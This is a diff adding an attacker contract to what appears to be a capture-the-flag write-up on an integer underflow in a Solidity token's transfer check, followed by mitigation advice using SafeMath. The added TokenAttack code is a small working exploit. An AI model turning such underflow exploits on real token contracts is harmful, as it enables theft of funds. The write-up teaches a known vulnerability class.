@@ -6,6 +6,21 @@ The issue occurs in the lines `require(balances[msg.sender] - _value >= 0)` and 
 
 To exploit this vulnerability, the attacker can transfer 21 tokens (more than the initial 20) to another address. This will cause an underflow, setting the balance to a very large number.
 
+```solidity
+contract TokenAttack {
+    IToken private _token;
+
+    constructor(address _target) public {
+        _token = IToken(_target);
+    }
+
+    function attack() public {
+        _token.transfer(msg.sender, 1);
+    }
+}
+
+```
+
 To prevent underflows and overflows in Solidity, there are two options:
 
 1. Use OpenZeppelin's SafeMath library, which automatically checks for overflows and underflows in all mathematical operators.
